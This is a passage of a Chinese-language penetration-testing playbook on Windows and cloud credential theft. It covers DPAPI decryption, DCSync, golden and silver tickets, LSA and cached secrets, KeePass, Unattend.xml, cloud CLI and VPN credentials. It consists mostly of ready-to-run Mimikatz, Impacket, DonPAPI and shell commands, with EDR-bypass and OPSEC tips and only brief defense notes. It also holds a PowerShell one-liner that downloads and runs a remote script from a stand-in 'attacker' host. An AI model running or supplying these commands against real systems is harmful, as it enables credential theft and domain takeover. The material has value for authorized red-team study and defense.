SharpDPAPI.exe vault              # 解密 Windows Vault
SharpDPAPI.exe blob /target:<文件> # 解任意 DPAPI blob
```
**语法解析：** `credentials/masterkeys/vault/blob` 为功能子命令 _command_

**DonPAPI（Linux，远程 DPAPI 解密，走 SMB/RPC）**
_platform: linux_
```
DonPAPI.py <domain>/<user>:<pass>@<target>       # 远程取目标用户 DPAPI 凭据
DonPAPI.py -d <domain> -u <user> -p <pass> <target列表文件>
# 输出: 目标机的 masterkey + Credential Manager 明文（用户名/密码/目标）
```

**dploot（Linux，DPAPI 专项）**
_platform: linux_
```
dploot masterkeys -u <user> -p <pass> -d <domain> <target>
dploot credentials -u <user> -p <pass> -d <domain> <target>
dploot browser -u <user> -p <pass> -d <domain> <target>   # 联动浏览器凭据
```

**pypykatz（离线解析，DPAPI + LSASS）**
_platform: linux_
```
pypykatz dpapi prekey password -d <domain> -p <口令> <masterkey文件>
pypykatz dpapi prekey backupkey -o <backupkey.pvk> <masterkey文件>
pypykatz dpapi describe <blob文件>   # 解析 blob 结构（GUID/算法）
```
**语法解析：**
- `prekey password|backupkey` — 用口令或域备份密钥预解 masterkey _command_
- `describe` — 只解析不解密，先看结构 _command_

**输出解读**：本地链输出「目标(URL/主机) + 用户名 + 明文密码」；DonPAPI/dploot 输出「目标机 + masterkey GUID + 解密结果」，是域内批量收割的高价值入口；`describe` 先确认 blob 归属哪个 masterkey GUID 再解，避免盲试。

**⑥ DPAPI 域内横向（远程解密他人 blob）**
_platform: linux_
```
# 拿到域备份密钥后，可解密全域任意用户的 DPAPI 凭据：
#   DonPAPI.py 用 /pvk 参数 + 目标列表，批量远程解密各主机上的用户凭据
DonPAPI.py --pvk <backupkey.pvk> -d <domain> -u <user> -p <pass> -targets hosts.txt
# 价值: 域备份密钥 = 全域 DPAPI 万能钥匙，配合 RDP/浏览器凭据实现横向
```

**概述：** DPAPI 是 Windows 保护本机敏感数据（凭据管理器/浏览器/RDP）的机制；其安全性完全依赖 masterkey 与「域备份密钥」的保密。攻击侧一旦拿到域备份密钥，等于拿到全域用户 DPAPI 万能钥匙。

**漏洞原理：** masterkey 可由用户口令/域备份密钥/内存三种路径恢复；域备份密钥全域唯一且可被 DCSync 导出，属「设计使然」但可被滥用于横向解密。

**利用方法：** 1) 定位 masterkey 文件 2) 按三条路径恢复 masterkey 3) 用 SharpDPAPI/DonPAPI/dploot/pypykatz 解密 blob 4) 域备份密钥 → 批量横向解密。

**防御措施：** 1) 域备份密钥按最高机密保护（限制 DCSync 权限）2) 启用 Credential Guard + 受保护进程隔离 LSASS 3) 监控 `sekurlsa::dpapi`/异常 DPAPI 调用（Sysmon Event 10 + LSASS 访问）4) 监控 DCSync（Event 4662 + 高权限复制）。

---

### RDP凭证提取  `rdp-creds`
_提取保存的RDP连接密码_
子类：**RDP** · tags: `rdp` `credentials` `windows`

**前置条件：**
- 用户权限
- 已保存RDP密码

**攻击链：**

**查找RDP文件**
> 查找RDP连接文件
_platform: windows_
```
Get-ChildItem -Path "$env:USERPROFILE\Documents\*.rdp" -Recurse
```

**提取RDP密码**
> 列出保存的凭据
_platform: windows_
```
cmdkey /list
```

**使用Mimikatz**
> 解密RDP保存的密码
_platform: windows_
```
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\XXX
```


**概述：** RDP保存的密码存储在DPAPI保护的凭据管理器中。

**漏洞原理：** RDP密码可被提取用于横向移动。

**利用方法：** 利用流程：1) 查找RDP文件 2) 定位凭据 3) 解密密码

**防御措施：** 防御措施：1) 不保存RDP密码 2) 使用受限管理员模式

---

### WiFi凭证提取  `wifi-creds`
_提取保存的WiFi密码_
子类：**WiFi** · tags: `wifi` `credentials` `windows`

**前置条件：**
- 管理员权限
- 已连接WiFi

**攻击链：**

**列出WiFi配置文件**
> 显示所有WiFi配置文件
_platform: windows_
```
netsh wlan show profiles
```

**提取WiFi密码**
> 显示WiFi密码
_platform: windows_
```
netsh wlan show profile name="WiFi_Name" key=clear
```
**语法解析：**
- `netsh wlan show profile` — 显示WiFi配置 _command_
- `name="WiFi_Name"` — 指定WiFi名称 _parameter_
- `key=clear` — 以明文显示密码 _parameter_


**概述：** Windows保存的WiFi密码可通过netsh命令提取。

**漏洞原理：** WiFi密码以明文存储，管理员可查看。

**利用方法：** 利用流程：1) 列出WiFi配置 2) 显示密码

**防御措施：** 防御措施：1) 使用企业认证 2) 定期更换密码

---

### Windows Vault凭证  `vault-creds`
_从Windows凭据管理器提取凭证_
子类：**Vault** · tags: `vault` `credentials` `windows`

**前置条件：**
- 用户权限
- 已保存凭据

**攻击链：**

**列出Vault凭据**
> 列出所有Vault
_platform: windows_
```
vaultcmd /list
```

**导出Vault凭据**
> 列出Windows凭据
_platform: windows_
```
vaultcmd /listcreds:"Windows Credentials" /all
```

**使用Mimikatz**
> 从内存提取凭据管理器密码
_platform: windows_
```
sekurlsa::credman
```


**概述：** Windows凭据管理器存储各种应用密码。

**漏洞原理：** 凭据存储在内存中，可被提取。

**利用方法：** 利用流程：1) 列出Vault 2) 提取凭据

**防御措施：** 防御措施：1) 不保存敏感凭据 2) 使用Windows Hello

---

### KeePass凭证提取  `keepass-dump`
_从KeePass数据库提取密码_
子类：**KeePass** · tags: `keepass` `credentials` `password-manager`

**前置条件：**
- KeePass数据库文件
- 主密码或内存转储

**攻击链：**

**查找KeePass数据库**
> 搜索KeePass数据库文件
_platform: windows_
```
Get-ChildItem -Path C:\ -Filter "*.kdbx" -Recurse -ErrorAction SilentlyContinue
```

**内存提取主密码**
> 从KeePass进程内存提取
_platform: windows_
```
使用KeePassDump或KeeThief从内存提取主密码
```

**使用KeeThief**
> PowerShell提取KeePass密码
_platform: windows_
```
powershell -exec bypass -c "IEX(New-Object Net.WebClient).downloadString('http://attacker/KeeThief.ps1'); Get-KeePassPw
```


**概述：** KeePass主密码可能存在于内存中。

**漏洞原理：** KeePass在内存中保存解密后的数据。

**利用方法：** 利用流程：1) 找到数据库文件 2) 提取主密码 3) 解密数据库

**防御措施：** 防御措施：1) 使用强主密码 2) 启用安全桌面 3) 定期更换密码

---

### LSA Secrets提取  `lsa-secrets`
_从LSA Secrets提取敏感数据_
子类：**LSA** · tags: `lsa` `secrets` `windows`

**前置条件：**
- SYSTEM权限

**攻击链：**

**使用Mimikatz**
> 提取LSA Secrets
_platform: windows_
```
lsadump::secrets
```

**使用reg save**
> 导出注册表hive离线分析
_platform: windows_
```
reg save HKLM\SECURITY security.hive
reg save HKLM\SYSTEM system.hive
```

**使用Impacket**
> 离线提取LSA Secrets
_platform: linux_
```
secretsdump.py -security security.hive -system system.hive LOCAL
```


**概述：** LSA Secrets存储服务账户密码、缓存域密码等。

**漏洞原理：** LSA Secrets可被SYSTEM权限用户提取。

**利用方法：** 利用流程：1) 获取SYSTEM权限 2) 提取LSA Secrets

**防御措施：** 防御措施：1) 限制SYSTEM权限 2) 使用Credential Guard

---

### 缓存凭证提取  `cached-creds`
_提取域缓存凭证_
子类：**缓存** · tags: `cached` `credentials` `domain`

**前置条件：**
- SYSTEM权限
- 域环境

**攻击链：**

**使用Mimikatz**
> 提取缓存域凭证
_platform: windows_
```
lsadump::cache
```

**使用reg save**
> 导出SECURITY hive
_platform: windows_
```
reg save HKLM\SECURITY security.hive
```

**离线破解**
> 缓存凭证可离线破解
_platform: linux_
```
使用hashcat破解缓存的域凭证
```


**概述：** Windows缓存域用户凭证以便离线登录。

**漏洞原理：** 缓存凭证可被提取和破解。

**利用方法：** 利用流程：1) 提取缓存凭证 2) 离线破解

**防御措施：** 防御措施：1) 减少缓存数量 2) 使用强密码

---

### DCSync攻击  `dcsync-attack`
_模拟域控制器同步获取凭证_
子类：**域渗透** · tags: `dcsync` `domain-controller` `mimikatz`

**前置条件：**
- 域管理员权限或特定权限

**攻击链：**

**使用Mimikatz**
> 使用Mimikatz执行DCSync
_platform: windows_
```
mimikatz # lsadump::dcsync /domain:domain.com /user:Administrator
```
**语法解析：**
- `lsadump::dcsync` — DCSync模块 _command_
- `/domain:domain.com` — 目标域名 _parameter_
- `/user:Administrator` — 目标用户 _parameter_

**使用impacket**
> 使用impacket执行DCSync
_platform: linux_
```
python secretsdump.py -just-dc-user Administrator domain.com/user:password@dc_ip
```

**导出所有哈希**
> 导出域内所有用户哈希
_platform: windows_
```
mimikatz # lsadump::dcsync /domain:domain.com /all /csv
```

**权限要求**
> DCSync所需权限
```
需要以下权限之一:
- Domain Admin
- Enterprise Admin
- 复制目录更改权限
```


**概述：** DCSync模拟域控制器复制获取所有凭证。

**漏洞原理：** 域复制协议缺乏足够的认证验证。

**利用方法：** 利用流程：1) 获取高权限 2) 执行DCSync 3) 获取所有哈希

**防御措施：** 防御措施：1) 监控DCSync行为 2) 最小权限原则 3) 审计复制权限

---

### 黄金票据攻击  `golden-ticket`
_使用krbtgt哈希生成黄金票据_
子类：**域持久化** · tags: `golden-ticket` `krbtgt` `kerberos`

**前置条件：**
- krbtgt账户哈希
- 域SID

**攻击链：**

**获取krbtgt哈希**
> 获取krbtgt账户哈希
_platform: windows_
```
mimikatz # lsadump::lsa /inject /name:krbtgt
```

**获取域SID**
> 获取域SID
_platform: windows_
```
whoami /user
或: wmic useraccount get sid
```

**生成黄金票据**
> 生成并注入黄金票据
_platform: windows_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
```
**语法解析：**
- `kerberos::golden` — 黄金票据模块 _command_
- `/user:Administrator` — 伪造的用户 _parameter_
- `/sid:S-1-5-21-xxx` — 域SID _parameter_
- `/krbtgt:HASH` — krbtgt NTLM哈希 _parameter_
- `/ptt` — 直接注入内存 _parameter_

**验证票据**
> 验证黄金票据是否有效
_platform: windows_
```
klist
或: dir \\dc.domain.com\c$
```


**概述：** 黄金票据可持久化访问整个域。

**漏洞原理：** krbtgt密码很少更改，票据有效期长。

**利用方法：** 利用流程：1) 获取krbtgt哈希 2) 生成票据 3) 持久化访问

**防御措施：** 防御措施：1) 定期更换krbtgt密码 2) 监控异常票据 3) 使用PAM

---

### 白银票据攻击  `silver-ticket`
_使用服务账户哈希生成白银票据_
子类：**域持久化** · tags: `silver-ticket` `kerberos` `service`

**前置条件：**
- 服务账户哈希
- 域SID

**攻击链：**

**获取服务哈希**
> 获取服务账户哈希
_platform: windows_
```
mimikatz # sekurlsa::logonpasswords
寻找服务账户NTLM哈希
```

**生成白银票据**
> 生成针对特定服务的票据
_platform: windows_
```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
```
**语法解析：**
- `/target:server.domain.com` — 目标服务器 _parameter_
- `/service:cifs` — 服务类型(CIFS) _parameter_
- `/rc4:HASH` — 服务账户NTLM哈希 _parameter_

**常见服务类型**
> 可伪造的服务类型
```
CIFS - 文件共享
HTTP - Web服务
LDAP - 目录服务
MSSQLSvc - SQL服务
HOST - 远程管理
```


**概述：** 白银票据针对特定服务，比黄金票据更隐蔽。

**漏洞原理：** 服务账户密码可被获取。

**利用方法：** 利用流程：1) 获取服务哈希 2) 生成票据 3) 访问服务

**防御措施：** 防御措施：1) 服务账户强密码 2) 监控异常票据 3) 定期轮换密码

---

### 无人值守安装凭证提取  `unattended-creds`
_从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证_
子类：**文件凭证** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`

**前置条件：**
- 本地文件系统读取权限
- 目标使用过无人值守部署

**攻击链：**

**搜索无人值守安装文件**
> 在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中
_platform: windows_
```
dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
```
**语法解析：**
- `dir /s /b` — 递归搜索并仅输出文件完整路径 _command_
- `C:\\Windows\\Panther\\` — Windows安装日志和配置默认存放目录 _value_
- `C:\\Windows\\System32\\Sysprep\\` — Sysprep系统准备工具配置目录 _value_
- `2>nul` — 抑制文件未找到的错误输出 _operator_

**全盘搜索Unattend文件**
> 当默认路径找不到时，全盘递归搜索所有可能的无人值守文件
_platform: windows_
```
# CMD方式
dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul

# PowerShell方式
Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
```
**语法解析：**
- `Get-ChildItem -Recurse` — PowerShell递归搜索 _command_
- `-Include` — 按通配符模式匹配文件名 _parameter_
- `-ErrorAction SilentlyContinue` — 忽略权限不足等错误 _parameter_

**提取明文密码**
> 从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中
_platform: windows_
```
# 查看文件内容
type C:\Windows\Panther\Unattend.xml

# 关键字段搜索
findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml

# PowerShell提取
[xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
$xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
```
**语法解析：**
- `findstr /i /c:` — 不区分大小写搜索指定字符串 _command_
- `Password` — 密码字段关键字 _value_
- `AdminPassword` — 管理员密码字段 _value_
- `AutoLogon` — 自动登录配置(含明文密码) _value_
- `[xml]$xml` — 将XML文件解析为PowerShell XML对象 _command_

**解码Base64密码**
> Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII
_platform: windows_
```
# PowerShell解码Base64
$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))

# 或者使用certutil
echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
type C:\temp\decoded.txt
```
**语法解析：**
- `[System.Text.Encoding]::Unicode` — UTF-16LE解码(Windows默认) _command_
- `FromBase64String` — Base64解码方法 _command_
- `certutil -decode` — 使用系统自带工具解码Base64 _command_

**检查其他敏感安装文件**
> 除Unattend.xml外，其他位置也可能存储明文凭证
_platform: windows_
```
# 检查GPP(Group Policy Preferences)密码
findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul

# 检查IIS配置文件
type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"

# 检查VNC密码文件
reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul

# 检查WiFi密码
netsh wlan show profiles
netsh wlan show profile name="目标WiFi" key=clear
```
**语法解析：**
- `cpassword` — GPP使用的AES加密密码字段(密钥已公开) _value_
- `sysvol` — 域控共享目录，所有域用户可读 _value_
- `reg query` — 查询注册表中的密码值 _command_

**使用Metasploit自动化**
> 使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证
_platform: windows_
```
# Metasploit模块
use post/windows/gather/enum_unattend
set SESSION 1
run

# 也可以使用
use post/multi/gather/firefox_creds
use post/windows/gather/credentials/gpp
use post/windows/gather/cachedump
```
**语法解析：**
- `post/windows/gather/enum_unattend` — 自动搜索并解析Unattend文件 _value_
- `post/windows/gather/credentials/gpp` — 提取GPP存储的凭证 _value_

**EDR 绕过变体：**

**绕过文件访问监控**
> 通过卷影副本或流式读取绕过文件访问监控
_platform: windows_
```
# 使用Volume Shadow Copy读取被锁定的文件
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml

# 使用PowerShell流式读取避免文件锁
[IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
```


**分析：** 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。

**OPSEC 提示：**
- 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。

**概述：** 无人值守安装文件(Unattend.xml)用于Windows自动化部署，可能包含管理员凭证。

**漏洞原理：** Windows部署工具(如MDT、SCCM)生成的Unattend.xml文件中，密码以明文或弱编码(Base64)存储，且部署完成后文件常残留在系统中。

**利用方法：** 利用流程：1) 搜索默认路径下的Unattend/Sysprep文件 2) 提取Password/AutoLogon字段 3) 解码Base64密码 4) 使用获取的凭证横向移动

**防御措施：** 防御措施：1) 部署完成后立即删除Unattend文件 2) 不在Unattend中存储域管理员密码 3) 使用LAPS管理本地管理员密码 4) 定期审计敏感文件

**参考：**
- <https://attack.mitre.org/techniques/T1552/001/>

---

### 云 CLI 凭据文件收集  `cloud-cli-creds`
_攻陷主机后收集云 CLI 凭据文件（AWS/Azure/GCP/kubeconfig/Terraform state）_
子类：**云凭据** · tags: `cloud` `aws` `azure` `gcp` `kubeconfig` `terraform` `t1552`

**前置条件：**
- 已获得目标主机 shell（开发机/运维机/CI 节点常见）
- 目标主机装有云 CLI 或残留云凭据文件

**攻击链：**

**凭据文件路径表（T1552 系列）**
_platform: linux_
```
# AWS
~/.aws/credentials              # [default] aws_access_key_id / aws_secret_access_key
~/.aws/config                   # 角色/区域配置
# GCP
~/.config/gcloud/access_tokens.json      # OAuth access token（短期有效）
~/.config/gcloud/credentials.db          # 凭据数据库
~/.config/gcloud/application_default_credentials.json   # ADC（服务账号私钥）
# Azure
~/.azure/accessTokens.json               # accessToken + refreshToken
~/.azure/azureProfile.json               # 订阅/租户配置
# Kubernetes
~/.kube/config                  # kubeconfig（含 token/client-cert）
# Terraform
terraform.tfstate               # 含资源属性与可能的内嵌密钥
*.tfvars                        # 变量文件常含 access_key/secret
```

**一键定位与提取**
_platform: linux_
```
find / -type f \( -path "*/.aws/credentials" -o -path "*/.azure/*.json" \
  -o -path "*/.config/gcloud/*.json" -o -name "kubeconfig" -o -name "*.tfstate" -o -name "*.tfvars" \) 2>/dev/null

# 快速核对 token 有效性
cat ~/.config/gcloud/access_tokens.json | jq -r '.access_token' | cut -c1-30
aws sts get-caller-identity --profile <profile> 2>/dev/null
az account show 2>/dev/null | jq '{name,id,tenantId}'
```
**语法解析：**
- `-path "*/.aws/credentials"` — 精确匹配已知凭据路径 _command_
- `aws sts get-caller-identity` — 验证 AK/SK 有效性并回显身份 _command_

**Windows 等价路径**
_platform: windows_
```
dir /s /b "%USERPROFILE%\.aws\credentials" "%USERPROFILE%\.azure\*.json" "%USERPROFILE%\.kube\config" 2>nul
# 环境变量中的云凭据
set | findstr /i "AWS_ACCESS_KEY AWS_SECRET AZURE_CLIENT_SECRET GOOGLE_APPLICATION_CREDENTIALS"
```

**输出解读**：`access_tokens.json`/`azureProfile.json` 的 token 有有效期（GCP access token 约 1 小时），拿到后立即用；`application_default_credentials.json` 与 `.aws/credentials` 为长期凭据，价值最高；`terraform.tfstate`/`tfvars` 常内嵌 AK/SK 与数据库口令。

**证据要求**：文件路径 + 云厂商 + 凭据类型（长期/短期）+ 掩码值 + 身份验证回显（`get-caller-identity`）。

**防御措施：** 1) 云凭据用短期令牌/工作负载身份（IMDS/Workload Identity）2) 禁止 AK/SK 落盘 3) terraform state 远端加密存储 4) 监控云 API 的异常身份使用（CloudTrail/Audit Logs）。

---

### VPN 客户端凭据收集  `vpn-creds`
_提取 OpenVPN/FortiClient/Pulse Secure/AnyConnect/WireGuard 客户端保存的口令_
子类：**VPN** · tags: `vpn` `openvpn` `forticlient` `anyconnect` `wireguard` `credential`

**前置条件：**
- 已获得目标主机 shell（用户权限，部分需管理员读注册表）
- 目标装有 VPN 客户端且保存了口令

**攻击链：**

**客户端类型 × 存储位置 × 提取方式**
_platform: windows_
```
# OpenVPN: auth-user-pass 文件（明文用户名+口令）
dir /s /b "C:\Program Files\OpenVPN\config\*.ovpn" 2>nul
findstr /i "auth-user-pass" "C:\Program Files\OpenVPN\config\*.ovpn" 2>nul
type <auth-user-pass 指向的凭据文件>   # 明文账号口令

# FortiClient: 注册表 + 配置文件（凭据加密存储，可用 DPAPI/专用脚本解）
reg query "HKLM\SOFTWARE\Fortinet\FortiClient\Sslvpn" /s 2>nul

# Pulse Secure / AnyConnect (Cisco): 凭据存注册表/配置，常 DPAPI 保护
reg query "HKCU\Software\Pulse Secure" /s 2>nul
reg query "HKCU\Software\Cisco\AnyConnect" /s 2>nul

# WireGuard: 私钥文件（明文，直接可复用到新端点）
dir /s /b "C:\Program Files\WireGuard\*.conf" "C:\Windows\System32\config\systemprofile\AppData\Local\WireGuard\*.conf" 2>nul
type <wg.conf> | findstr /i "PrivateKey"
```

**Linux 等价路径**
_platform: linux_
```
cat /etc/openvpn/*.ovpn 2>/dev/null | grep -iE "auth-user-pass|ca |cert |key "
cat /etc/openvpn/auth.txt 2>/dev/null
cat /etc/wireguard/*.conf 2>/dev/null | grep -iE "PrivateKey|Address"
```

**输出解读**：OpenVPN 的 `auth-user-pass` 指向文件为明文账号口令，直接可用；WireGuard `PrivateKey` 为 Base64 私钥，复制到攻击机即可接入内网（注意需匹配对端公钥）；FortiClient/Pulse/AnyConnect 为 DPAPI/厂商加密，走 dpapi-creds 链或专用提取脚本。

**证据要求**：客户端类型 + 配置文件路径 + 掩码凭据 + 私钥存在性（不整文件外带私钥）。

**防御措施：** 1) VPN 私钥/口令用硬件令牌或证书 2) 客户端不保存口令 3) WireGuard 私钥最小权限存储 4) 监控 VPN 配置文件的非授权访问。

---
